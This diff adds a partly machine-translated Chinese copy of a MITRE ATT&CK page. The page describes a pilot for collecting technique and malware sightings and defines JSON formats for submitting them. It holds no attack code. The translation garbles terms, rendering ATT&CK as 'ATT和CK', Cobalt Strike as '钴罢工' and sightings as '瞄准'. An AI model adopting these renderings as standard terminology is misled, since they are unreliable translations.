@@ -1,0 +1,528 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="zh-CN" class="translated-ltr"><head>
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-62667723-1"></script>
+        <script src="../theme/scripts/analytics.js"></script>
+        <meta name="google-site-verification" content="2oJKLqNN62z6AOCb0A0IXGtbQuj-lev5YPAHFF_cbHQ" />
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <link rel="shortcut icon" href="../theme/favicon.ico" type="image/x-icon" />
+        <title>资源：ATT和CK瞄准 -  MITRE ATT＆CK™</title>
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="../theme/style/bootstrap.min.css" />
+        <link rel="stylesheet" href="../theme/style/bootstrap-glyphicon.min.css" />
+        <link href="../theme/style/style.css" rel="stylesheet" type="text/css" /> <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css" /></head>
+
+<body>
+<!--stopindex-->
+<header style="height: 78.5469px;">
+        <nav class="navbar navbar-expand-lg navbar-dark fixed-top bg-mitre-red border-bottom">
+            <a class="navbar-brand" href="../index.html"><img src="../theme/images/mitre_attack.png" height="50px" /></a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon" onclick="search('')"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarCollapse">
+                <ul class="nav nav-tabs ml-auto">
+                            <li class="nav-item"><a href="../matrices/enterprise" class="nav-link"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">矩阵</font></font></b></a></li>
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="../tactics/enterprise" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">策略</font></font></b>
+                                </a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                                        <a class="dropdown-item" href="../tactics/pre"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRE-ATT＆CK </font></font></a>
+                                        <a class="dropdown-item" href="../tactics/enterprise"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业</font></font></a>
+                                        <a class="dropdown-item" href="../tactics/mobile"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动</font></font></a>
+                                </div>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="../techniques/enterprise" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font></font></b>
+                                </a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                                        <a class="dropdown-item" href="../techniques/pre"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRE-ATT＆CK </font></font></a>
+                                        <a class="dropdown-item" href="../techniques/enterprise"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业</font></font></a>
+                                        <a class="dropdown-item" href="../techniques/mobile"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移动</font></font></a>
+                                </div>
+                            </li>
+                            <li class="nav-item"><a href="../groups/index.html" class="nav-link"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组</font></font></b></a></li>
+                            <li class="nav-item"><a href="../software/index.html" class="nav-link"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件</font></font></b></a></li>
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="../resources.1" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                    <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源</font></font></b>
+                                </a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                                    <a class="dropdown-item" href="../resources.1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一般</font></font></a>
+                                    <a class="dropdown-item" href="getting-started.1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">入门</font></font></a>
+                                    <a class="dropdown-item" href="attackcon.1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT和CKcon </font></font></a>
+                                    <a class="dropdown-item" href="faq/index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常见问题解答</font></font></a>
+                                    <a class="dropdown-item" href="updates.1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新</font></font></a>
+                                    <!-- <a class="dropdown-item" href="/resources/supporters/">Supporters</a>
+                                            <a class="dropdown-item" href="/resources/industry-news/">Industry News</a> -->
+                                </div>
+                            </li>
+                            <li class="nav-item"><a href="https://medium.com/mitre-attack/" target="_blank" class="nav-link"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">博客</font></font></b> <img src="../theme/images/external-site.svg" alt="外部网站" class="external-icon" /></a></li>
+                            <li class="nav-item"><a href="../contact/index.html" class="nav-link"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系</font></font></b></a></li>
+                </ul>
+                <ul class="navbar-nav flex-row d-md-flex" style="float: right">  <!-- ml-md-auto d-none-->
+                    <li>
+                        <form class="form-inline pl-2">
+                            <input class="form-control" type="text" placeholder="Search site" aria-label="Search" id="search" autocomplete="off" />
+                        </form>
+                        <div class="search-results"></div>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+        </header>
+            <div class="container-fluid under-development"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+                在</font></font><a target="_blank" href="https://attackevals.mitre.org"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">attackevals.mitre.org</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看我们第一轮ATT和CK评估的</font><a target="_blank" href="https://attackevals.mitre.org"><font style="vertical-align: inherit;">结果</font></a><font style="vertical-align: inherit;">！
+            </font></font></div>
+        <!--startindex-->
+<div id="content">      
+<div class="container">
+    <div class="container-fluid">
+        <ol class="breadcrumb">
+            <li class="breadcrumb-item"><a href="../index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家</font></font></a></li>
+            <li class="breadcrumb-item"><a href="../resources.1"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源</font></font></a></li>
+            <li class="breadcrumb-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT＆CK瞄准</font></font></li>
+        </ol>
+        <div class="blog-post p-3">
+            <h1 class="blog-post-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT＆CK瞄准</font></font></h1><br />
+                <p><em><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT和CK团队认为，我们可以通过收集和报告整个社区的技术目标来最好地装备团队来防御对手，因此我们正在进行试点以征求这些数据。</font><font style="vertical-align: inherit;">您可以分享以帮助改善整个社区！</font></font></em></p>
+<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></h2>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然集成到ATT和CK的开源报告提供了关于哪些技术被哪些对手使用的重要信息，但它受到各种偏见的影响：</font></font></p>
+<ul>
+<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新颖性偏见</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：新的和有趣的技术或新演员使用的现有技术得到报道，而一次又一次使用的磨机技术的运行则没有。</font></font></li>
+<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可见性偏差</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：发布英特尔报告的组织可以看到某些技术，而不是其他技术。</font><font style="vertical-align: inherit;">对于事件响应者，响应正在进行中的火灾，通过灰烬筛选以发现发生的事情也将给出不同的观点。</font><font style="vertical-align: inherit;">并非所有技术都可以在事件发生期间或之后以相同的方式查看。</font></font></li>
+<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">制片人偏见</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：一些组织发布了更多的报道，他们所拥有的客户类型或可见度可能无法反映更广泛的行业/世界。</font></font></li>
+<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者偏见</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：某些类型的受害组织可能比其他组织更有可能报告（或报告）。</font></font></li>
+<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用性偏差</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：报告作者认为更频繁地包含这些技术，因此可能会更频繁地报告这些技术。</font></font></li>
+</ul>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这并不意味着威胁报告中包含的信息毫无用处 - 显然，它对于告诉我们使用的是什么，由谁以及如何使用非常有用。</font><font style="vertical-align: inherit;">它是ATT和CK知识库的完整基础。</font><font style="vertical-align: inherit;">但是，它的意思是将其用作原始数据来了解技术的流行程度，或者随着时间的推移和跨行业的利用方式，可能会给出欺骗性的答案。</font><font style="vertical-align: inherit;">如果您优先考虑防御性操作，这一点尤其重要 - 您希望将防御重点放在更多对手更常使用的技术上，而不仅仅是那些新的和有趣的或更容易想到的技术。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了帮助解决这个问题并扩展ATT和CK作为数据驱动知识库的基础，该团队将开始征求</font><font style="vertical-align: inherit;">ATT和CK技术</font><font style="vertical-align: inherit;">原始</font></font><em><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标</font></font></em><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font><font style="vertical-align: inherit;">贡献</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们希望这些数据能够帮助我们改善ATT和CK知识库本身，并使消费者更容易理解如何使用技术。
+</font></font><br /><br /></p>
+<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">瞄准类型</font></font></h2>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT和CK目击数据收集将采用三种形式，每种形式提供对技术使用的不同洞察。</font></font></p>
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接看到一种技术</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT＆CK团队最感兴趣的是在攻击过程中实际发现技术的数据。</font><font style="vertical-align: inherit;">换句话说，在事件调查期间收集的数据表明，对手实际上使用了一种或多种ATT和CK技术（或针对）受害者基础设施。</font><font style="vertical-align: inherit;">将多种技术作为单次攻击的一部分进行检测的情况应报告为单一目击，并列出多种技术。</font></font></p>
+<p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：如果mimikatz在受害者计算机上用于转储凭据并且由EDR工具观察到，则它将构成直接瞄准凭证转储。</font><font style="vertical-align: inherit;">例如，这可能采取访问lsass.exe内存的进程的形式。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接观察技术是最有价值的瞄准类型，因为它们在事实层面上告诉你，对手依靠特定的技术来进行攻击。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><a href="sightings#direct-technique-sighting"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接技术瞄准</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式</font><font style="vertical-align: inherit;">报告</font><a href="sightings#direct-technique-sighting"><font style="vertical-align: inherit;">直接技术目击</font></a><font style="vertical-align: inherit;">。</font></font></p>
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接瞄准恶意软件</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，可能无法直接观察到某种技术（或者甚至可以在感知能力的情况下观察到这种技术），但是机器上存在一个恶意软件会给出强烈暗示它被使用的暗示。</font><font style="vertical-align: inherit;">在其他情况下，执行技术的软件可能会在周边被阻止 - 在这种情况下，它表明对手可能想要使用某种技术但却无法使用。</font></font></p>
+<p><em><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：谈论恶意软件时，当然有灰色区域。</font><font style="vertical-align: inherit;">我们的意思是可用于执行恶意攻击的工具，包括通常称为“渗透测试”软件的东西以及明显恶意的软件。</font><font style="vertical-align: inherit;">另一方面，我们并不是指内置的操作系统功能。</font><font style="vertical-align: inherit;">所以，请</font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给我们的东西像Metasploit工具或钴罢工目击，但</font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不要</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给我们的PowerShell或net命令的踪迹。</font><font style="vertical-align: inherit;">后一项应报告为直接观察技术（例如，T1086）。</font></font></em></p>
+<p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：mimikatz.exe在计算机上的存在，但没有证据表明它实际上是为了转储凭据 - 或者mimikatz.exe在周边或反恶意软件被阻止 - 将构成对mimikatz的直接瞄准。</font><font style="vertical-align: inherit;">从那时起，您可以假设尝试执行mimikatz中可用的凭证访问技术 - 但由于没有直接观察它们，您无法确定究竟发生了什么或可能发生了什么。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，直接软件观察对</font></font><a href="../software/index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT和CK</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中</font><a href="../software/index.html"><font style="vertical-align: inherit;">已包含的软件</font></a><font style="vertical-align: inherit;">最有用，</font><font style="vertical-align: inherit;">它直接启用一种或多种ATT和CK技术。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><a href="sightings#direct-software-sighting"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接软件瞄准</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式</font><font style="vertical-align: inherit;">报告</font><a href="sightings#direct-software-sighting"><font style="vertical-align: inherit;">直接软件目击</font></a><font style="vertical-align: inherit;">。</font></font></p>
+<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">间接目击恶意软件</font></font></h4>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在其他情况下，威胁情报平台或ISAC可能具有间接证明正在使用某个软件而不直接观察它的事实的数据馈送。</font></font></p>
+<p><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：共享给ISAC或威胁英特尔平台的mimikatz.exe的文件哈希将间接发现mimikatz.exe。</font><font style="vertical-align: inherit;">与直接发现恶意软件一样，这确实提供了对手有兴趣执行凭据访问的一些指示（尽管较弱）。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，如上所述，间接软件目标对</font></font><a href="../software/index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ATT和CK</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中</font><a href="../software/index.html"><font style="vertical-align: inherit;">已包含的软件</font></a><font style="vertical-align: inherit;">最有用，</font><font style="vertical-align: inherit;">它直接启用一种或多种ATT和CK技术。</font><font style="vertical-align: inherit;">此外，只有在合理推定他们未被另一方报告时，才应报告间接目击。</font><font style="vertical-align: inherit;">换句话说，除非您拥有或操作TIP，否则不要为某些TIP编写刮刀并为该TIP中的所有IOC发送目击（如果您这样做，请将目击发送给我们！）。</font></font></p>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><a href="sightings#indirect-software-sighting"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">间接软件瞄准</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式</font><font style="vertical-align: inherit;">报告</font><a href="sightings#indirect-software-sighting"><font style="vertical-align: inherit;">间接软件目击</font></a><font style="vertical-align: inherit;">。
+</font></font><br /><br /></p>
+<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据使用</font></font></h2>
+<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总的来说，ATT和CK团队认为，更多原始数据的更丰富的数据收集将使我们能够更好地理解技术在实践中的使用方式。</font><font style="vertical-align: inherit;">您可以提出以下问题：</font></font></p>
+<ul>
+<li>Which techniques are used more often?</li>
+<li>Do the techniques used differ by sector?</li>
+<li>Do the techniques used differ by actor type (APT vs. FIN)?</li>
+<li>How does usage change over time?</li>
+</ul>
+<p>Though the eventual goal of this program is to provide useful data to the community, in order to tread carefully, at this initial piloting stage we would keep the data internal to the MITRE ATT&amp;CK team and would protect it by an NDA. The goals of this would be to:</p>
+<ul>
+<li>Prove the concept works and that quality data can be collected</li>
+<li>Understand the differences between the types of data that are contributed, and how they can still be aggregated to provide a consistent picture</li>
+<li>Work with submitters to identify how they want data to eventually be published (i.e., how it’s attributed, how data from different submitters is combined, how much it has to be aggregated, etc.)</li>
+<li>Iron out any kinks in the collection process (our data format, etc.)</li>
+</ul>
+<p>After those initial steps are completed (we expect a few months, but it could be longer) and the participants can agree on how they want the data published we’ll begin initial operations. At that phase, we’ll continue to work closely with all submitters to ensure that we get the data we’re expecting. Over time, we can transition to more automated collection and processing.</p>
+<p>Note that this is not an operational threat sharing mechanism and we do not intend to ever directly share even anonymized raw sightings data.</p>
+<p></p><center><img src="../theme/images/sightings-lifecycle.png" alt="试点到成熟的ops流程的初始操作" /></center>
+<br /><br /><p></p>
+<h2>Contribute</h2>
+<p>Have data that fits into one of these buckets? Contact us at <a href="mailto:attack@mitre.org">attack@mitre.org</a> to get started! In particular we hope that EDR vendors, intel reporters, TIP vendors, ISACs, and end user organizations can help the community by providing this data. The format description below is meant to get you started -- if you have any questions simply get in touch.</p>
+<p>We'd also love to hear from you if you would you find data like this useful or have ideas on how we can publish it to make it useful.
+<br /><br /></p>
+<h2>Format Definitions</h2>
+<p>All formats are JSON and consist of either a list of entries or a single entry. Please e-mail <a href="mailto:attack@mitre.org">attack@mitre.org</a> with any questions or suggestions.</p>
+<p>Fields in <strong>bold</strong> are required, all other fields are optional. For the "Timestamp" datatype, please use RFC 3339 timestamps in UTC time. Most importantly, please do not include any information beyond that specified in the format below. In particular, we do not want to collect sensitive victim information or other PII.</p>
+<h4><a class="anchor" name="direct-technique-sighting"></a>direct-technique-sighting</h4>
+<table class="table table-striped">
+<thead>
+<tr>
+<th>Field</th>
+<th>Datatype</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>id</strong>*</td>
+<td>String</td>
+<td>A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.</td>
+</tr>
+<tr>
+<td><strong>sightingType</strong>*</td>
+<td>String</td>
+<td><strong>MUST</strong> be "direct-technique-sighting" to indicate that this is a direct technique sighting.</td>
+</tr>
+<tr>
+<td><strong>startTime</strong>*</td>
+<td>Timestamp</td>
+<td>The time the activity started.</td>
+</tr>
+<tr>
+<td><strong>endTime</strong>*</td>
+<td>Timestamp</td>
+<td>The time the activity ended.</td>
+</tr>
+<tr>
+<td><strong>detectionType</strong>*</td>
+<td>String</td>
+<td>One of "human-validated" or "raw". Use validated when a human analyst has reviewed the detection and determined it to not be a false positive.</td>
+</tr>
+<tr>
+<td><strong>techniques</strong>*</td>
+<td>List[<a href="sightings#technique">Technique</a>]</td>
+<td>The list of techniques that were observed (see technique table below).</td>
+</tr>
+<tr>
+<td>sectors</td>
+<td>List[String]</td>
+<td>A list of sectors that the victim belongs to.</td>
+</tr>
+<tr>
+<td>country</td>
+<td>String</td>
+<td>The ISO country code of the victim.</td>
+</tr>
+<tr>
+<td>size</td>
+<td>String</td>
+<td>The approximate size (in number of employees) of the victim.</td>
+</tr>
+<tr>
+<td>attributionType</td>
+<td>String</td>
+<td>Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.</td>
+</tr>
+<tr>
+<td>attribution</td>
+<td>String</td>
+<td>The name of the threat group, incident/campaign, or malicious software associated to this activity. This should ideally be an exact name from the list of <a href="../groups/index.html">Group aliases</a> already in ATT&amp;CK for threat groups, and of <a href="../software/index.html">Software aliases</a> already in ATT&amp;CK for malicious software.</td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h4><a class="anchor" name="direct-software-sighting"></a>direct-software-sighting</h4>
+<table class="table table-striped">
+<thead>
+<tr>
+<th>Field</th>
+<th>Datatype</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>id</strong>*</td>
+<td>String</td>
+<td>A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.</td>
+</tr>
+<tr>
+<td><strong>sightingType</strong>*</td>
+<td>String</td>
+<td><strong>MUST</strong> be "direct-software-sighting" to indicate that this is a direct software sighting.</td>
+</tr>
+<tr>
+<td><strong>startTime</strong>*</td>
+<td>Timestamp</td>
+<td>The time the activity started.</td>
+</tr>
+<tr>
+<td><strong>endTime</strong>*</td>
+<td>Timestamp</td>
+<td>The time the activity ended.</td>
+</tr>
+<tr>
+<td><strong>detectionType</strong>*</td>
+<td>String</td>
+<td>One of "human-validated" or "raw". Use validated when a human analyst has reviewed the detection and determined it to not be a false positive.</td>
+</tr>
+<tr>
+<td><strong>software</strong>*</td>
+<td>String</td>
+<td>The malicious software that was observed. This should ideally be an exact name from the <a href="../software/index.html">list of Software aliases</a> already in ATT&amp;CK.</td>
+</tr>
+<tr>
+<td><strong>techniques</strong>*</td>
+<td>List[<a href="sightings#technique">Technique</a>]</td>
+<td>The list of techniques that are associated with this malware.</td>
+</tr>
+<tr>
+<td>sectors</td>
+<td>List[String]</td>
+<td>A list of sectors that the victim belongs to.</td>
+</tr>
+<tr>
+<td>country</td>
+<td>String</td>
+<td>The ISO country code of the victim.</td>
+</tr>
+<tr>
+<td>size</td>
+<td>String</td>
+<td>The approximate size (in number of employees) of the victim.</td>
+</tr>
+<tr>
+<td>attributionType</td>
+<td>String</td>
+<td>Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.</td>
+</tr>
+<tr>
+<td>attribution</td>
+<td>String</td>
+<td>The name of the threat group or incident/campaign associated to this malware. This should ideally be an exact name from the list of <a href="../groups/index.html">Group aliases</a> already in ATT&amp;CK for threat groups.</td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h4><a class="anchor" name="indirect-software-sighting"></a>indirect-software-sighting</h4>
+<table class="table table-striped">
+<thead>
+<tr>
+<th>Field</th>
+<th>Datatype</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>id</strong>*</td>
+<td>String</td>
+<td>A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.</td>
+</tr>
+<tr>
+<td><strong>sightingType</strong>*</td>
+<td>String</td>
+<td><strong>MUST</strong> be "indirect-software-sighting" to indicate that this is an indirect software sighting.</td>
+</tr>
+<tr>
+<td><strong>time</strong>*</td>
+<td>Timestamp</td>
+<td>The time the indicator was seen.</td>
+</tr>
+<tr>
+<td><strong>software</strong>*</td>
+<td>String</td>
+<td>The malicious software that was observed. This should ideally be an exact name from the <a href="../software/index.html">list of Software aliases</a> already in ATT&amp;CK.</td>
+</tr>
+<tr>
+<td><strong>ioc</strong>*</td>
+<td>String</td>
+<td>The IOC (e.g., hash) that was seen. This is only used for de-duplication, please do not use this as an IOC submission mechanism.</td>
+</tr>
+<tr>
+<td><strong>techniques</strong>*</td>
+<td>List[<a href="sightings#technique">Technique</a>]</td>
+<td>The list of techniques that are associated with this malware.</td>
+</tr>
+<tr>
+<td>sectors</td>
+<td>List[String]</td>
+<td>A list of sectors that the victim belongs to.</td>
+</tr>
+<tr>
+<td>country</td>
+<td>String</td>
+<td>The ISO country code of the victim.</td>
+</tr>
+<tr>
+<td>size</td>
+<td>String</td>
+<td>The approximate size (in number of employees) of the victim.</td>
+</tr>
+<tr>
+<td>attributionType</td>
+<td>String</td>
+<td>Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.</td>
+</tr>
+<tr>
+<td>attribution</td>
+<td>String</td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与此活动关联的威胁组，事件/活动或软件的名称。</font><font style="vertical-align: inherit;">理想情况下，这应该是</font><font style="vertical-align: inherit;">ATT和CK中针对威胁组已经存在</font><font style="vertical-align: inherit;">的</font></font><a href="../groups/index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组别名</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表</font><font style="vertical-align: inherit;">以及</font><font style="vertical-align: inherit;">已经存在于ATT和CK中用于恶意软件</font><font style="vertical-align: inherit;">的</font></font><a href="../software/index.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件别名</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的确切名称</font><font style="vertical-align: inherit;">。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单[ </font></font><a href="sightings#technique"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ]</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观察到的技术清单（见下面的技术表）。</font><font style="vertical-align: inherit;">对于尚未在ATT和CK中的软件，</font><font style="vertical-align: inherit;">这是</font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必需</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的。</font></font></td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h4><a class="anchor" name="technique"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font></font></h4>
+<table class="table table-striped">
+<thead>
+<tr>
+<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域</font></font></th>
+<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据类型</font></font></th>
+<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术ID</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> *</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">串</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观察到的ATT和CK ID（例如，“T1086”）。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">平台</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">串</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观察这种技术的平台。</font><font style="vertical-align: inherit;">请包括全名，版本和版本。</font><font style="vertical-align: inherit;">例如，“Windows 10 Enterprise”，“Windows Server 2012 Standard”，“MacOS 10.13.5”，“Ubuntu 14.04”。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始时间</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间戳</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">观察这种特定技术的时间。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间结束</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间戳</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种特定技术瞄准结束的时间。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">战术</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">串</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此技术用于启用的策略的名称。</font><font style="vertical-align: inherit;">例如，查看计划任务可以指示它是用于权限提升还是持久性。</font><font style="vertical-align: inherit;">格式应该是ATT和CK导航器层文件格式（小写虚线，凭证访问）中引用的技术名称。</font></font></td>
+</tr>
+<tr>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始数据</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列表[数据]</font></font></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始数据列表（如果可共享）支持此观察。</font><font style="vertical-align: inherit;">可以是命令行，事件记录等。按如下所述格式化。</font></font></td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h5><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式化原始数据</font></font></h5>
